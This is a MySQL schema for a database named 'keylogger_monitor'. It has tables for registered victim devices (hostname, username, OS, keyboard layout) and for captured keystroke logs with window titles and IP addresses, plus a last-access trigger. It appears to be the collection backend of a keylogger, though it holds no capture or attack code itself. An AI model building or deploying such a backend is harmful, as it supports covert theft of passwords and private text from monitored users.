DROP DATABASE IF EXISTS `keylogger_monitor`;
CREATE DATABASE `keylogger_monitor`;
USE `keylogger_monitor`;

CREATE TABLE IF NOT EXISTS `devices` (
    `uuid` VARCHAR(36) NOT NULL,
    `registered_on` DATETIME NOT NULL,
    `last_access` DATETIME NOT NULL,
    `cpu_desc` VARCHAR(256) NOT NULL,
    `device_name` VARCHAR(256) NOT NULL,
    `username` VARCHAR(256) NOT NULL,
    `device_type` VARCHAR(16) NOT NULL,
    `os_name` VARCHAR(32) NOT NULL,
    `keyboard_layout` VARCHAR(3) NOT NULL,
    PRIMARY KEY (`uuid`)
);

CREATE TABLE IF NOT EXISTS `logs` (
    `uuid` VARCHAR(36) NOT NULL,
    `timestamp_begin` DATETIME NOT NULL,
    `timestamp_end` DATETIME NOT NULL,
    `window_name` VARCHAR(512) NOT NULL,
    `log_text` TEXT NOT NULL,
    `ip_address` VARCHAR(16) NOT NULL,
    PRIMARY KEY (`uuid`, `timestamp_begin`),
    FOREIGN KEY (`uuid`) REFERENCES devices(`uuid`) ON DELETE CASCADE
);

DELIMITER $$  

CREATE TRIGGER last_access_update
AFTER INSERT ON logs
FOR EACH ROW 
BEGIN
    UPDATE devices d
    SET d.last_access = NEW.timestamp_begin 
    WHERE d.uuid = NEW.uuid;
END;$$

DELIMITER ;